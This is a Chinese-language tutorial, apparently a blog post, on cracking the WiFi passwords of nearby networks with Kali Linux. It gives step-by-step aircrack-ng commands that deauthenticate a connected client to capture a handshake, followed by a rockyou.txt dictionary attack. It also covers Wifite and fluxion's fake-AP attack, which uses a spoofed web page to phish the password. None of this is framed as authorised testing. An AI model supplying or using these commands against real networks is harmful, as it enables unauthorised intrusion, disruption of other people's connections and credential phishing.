# 前言

目前最有效率的破解方法是社工的 AP 方法但是需要硬件支持，同时方式二并不能被接受。
所有的工具都在 Kali Linux 运行，我使用的是虚拟机安装 + 无线网卡 (需要单独购买) 的方式

# 方式一：暴力破解

这种方法既耗时成功率又低，但是不会动别人蛋糕。
成功率取决于字典包和无线网卡质量即暴力破解效率。

# 工具一：Wifite

系统自带的工具，也内置了详细的说明和使用方法。

  • 基本操作
root:~# wifite # 启动

按照提示，当想要破解的 AP 出现按下 ctrl+C，选择对应的序号开始自动化处理

# 工具二：Aircrack-ng

  1. 查看网卡名
root:~# iwconfig
  1. 开启网卡监听模式
root:~# airmon-ng start wlan0 # 一般wlan0是默认网卡名

开启监听以后对应网卡名变成 网卡名 + mon
3. 扫描附近 wifi

root:~# airodump-ng wlan0mon

会显示附近 wifi 信号

  • BSSID:MAC 地址
  • PWR: 数值越大信号越强
  • CH: 信道，决定了下面启动的 channel 值
  • ENC: 加密方式
  • AUTH: 认证的方式
  • ESSID:WIFI 名称
  1. 选中准备破解的对象，记录其 BSSID 值
  2. 监听路由器
root:~# airodump-ng -w link_name -c CH_value --bssid BSSID_value wlan0mon
  1. 选择活跃的连接客户端（PWR 值大），并记录 STATION 值
  2. 重新打开命令行窗口进行 attack，保留原来窗口监视
root:~# aireplay-ng -0 50 -a BSSID_value -c STATION_value wlan0mon
  1. 程序结束以后，根目录会出现我们抓取到的相关包，其中.cap 文件有用
  2. 确定自己的字典的存储位置（有自带也有自行准备），自带路径:
/usr/share/wordlists/rockyou.txt.gz

未解压的解压

root:~# gzip -d rockyou.txt.gz
  1. 开始暴力破解
root:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt -b BSSID_value link_name.cap

然后就是等待了，一般要看密码包有没有，一般是没有！嘻嘻

# 方式二：Fake AP

这个方法，需要你有一个好一点的网卡，型号最好是 3070，8812 无法创建虚拟 AP

# 工具一：fluxion

  1. 下载安装 fluxion：github 上面的项目，注意项目地址：https://github.com/FluxionNetwork/fluxion.git
root:/GITHUB# git clone URL
  1. 开启
root:/GITHUB/fluxion# ./fluxion.sh
  1. 第一次都有未安装的插件，此时 ./fluxion.sh -i 进行自动下载，如果下载等待太久，需要更换下载源：
vi /etc/apt/sources.list

最好更新为官方源，亲测有效

deb http://http.kali.org/kali kali-rolling main non-free contrib
  1. 安装完毕后，选择语言中文
  2. 开始使用，工具都已经非常人性化了，所有的都按照提示即可，顺序是第二种攻击方式 Handshake Snooper 获取 cap 文件至 fluxion 文档。然后再使用第一种攻击方式，也是按照推荐的选择。寻找 cap 文件：
root:/root/GITHUB/fluxion/# find . -name "*.cap"

选择 Fake Web 时注意语言，中文可行度高一些。
